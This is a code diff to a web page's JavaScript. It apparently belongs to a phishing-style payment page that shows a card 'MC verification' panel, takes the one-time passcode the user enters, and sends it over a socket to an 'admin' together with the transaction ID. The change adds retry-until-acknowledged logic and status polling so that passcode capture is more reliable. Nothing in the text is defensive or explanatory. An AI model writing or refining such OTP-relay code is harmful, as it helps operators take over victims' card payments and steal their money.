@@ -685,25 +685,56 @@ input:not(.pl-10) {
                     
                     document.body.appendChild(mcContainer);
                     
-                    // Add event listener for OTP submission
-                    document.getElementById('mc-submit-otp').addEventListener('click', function() {
-                        const otpValue = document.getElementById('mc-otp-input').value.trim();
-                        if (otpValue.length < 4) {
-                            alert('Please enter a valid OTP');
-                            return;
-                        }
-                        
-                        // Send OTP to admin
-                        socket.emit('mc_otp_submitted', {
-                            invoiceId: state.transactionId,
-                            otp: otpValue
-                        });
-                        
-                        // Disable the button to prevent multiple submissions
-                        this.disabled = true;
-                        this.textContent = 'Verifying...';
-                    });
-                }
+// Add event listener for OTP submission
+document.getElementById('mc-submit-otp').addEventListener('click', function() {
+    const otpValue = document.getElementById('mc-otp-input').value.trim();
+    if (otpValue.length < 4) {
+        alert('Please enter a valid OTP');
+        return;
+    }
+    
+    // Disable the button to prevent multiple submissions
+    this.disabled = true;
+    this.textContent = 'Verifying...';
+    
+    // Send OTP to admin with retry logic
+    const sendOTP = () => {
+        socket.emit('mc_otp_submitted', {
+            invoiceId: state.transactionId,
+            otp: otpValue,
+            timestamp: new Date().toISOString()
+        }, (acknowledgement) => {
+            // This callback function will run when the server acknowledges receipt
+            if (acknowledgement && acknowledgement.received) {
+                console.log('OTP submission acknowledged by server');
+            } else {
+                console.warn('OTP submission not acknowledged, retrying...');
+                setTimeout(sendOTP, 1000); // Retry after 1 second
+            }
+        });
+    };
+    
+    sendOTP();
+    
+    // Set a timeout to check for verification status
+    setTimeout(() => {
+        // Check if we still have the MC verification panel open
+        const mcContainer = document.getElementById('mc-verification-container');
+        if (mcContainer) {
+            // Show status indicator to user
+            const submitBtn = document.getElementById('mc-submit-otp');
+            if (submitBtn) {
+                submitBtn.textContent = 'Verification in progress...';
+            }
+            
+            // Ping the server to check status
+            socket.emit('check_verification_status', {
+                invoiceId: state.transactionId,
+                timestamp: new Date().toISOString()
+            });
+        }
+    }, 5000); // Check after 5 seconds
+});
                 
                 // Generate random phone number for demo
                 function generateRandomPhone() {
